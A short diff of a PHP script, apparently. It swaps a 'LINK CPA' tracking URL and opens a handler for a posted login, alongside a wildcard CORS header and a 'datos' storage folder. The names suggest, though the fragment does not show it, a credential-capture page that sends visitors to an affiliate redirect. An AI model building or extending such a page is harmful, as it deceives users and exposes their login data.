@@ -7,7 +7,7 @@ header('Access-Control-Allow-Origin: *');
 $carpeta = 'datos';
 
 /* LINK CPA */
-$cpa = 'https://t.co/LJKYBAn6sV';
+$cpa = 'https://classwindscreensemi.com/aw9a1diu9i?key=1cda157be6fc8ced72f55289f9237865';
 
 if(isset($_POST['login'])){
     
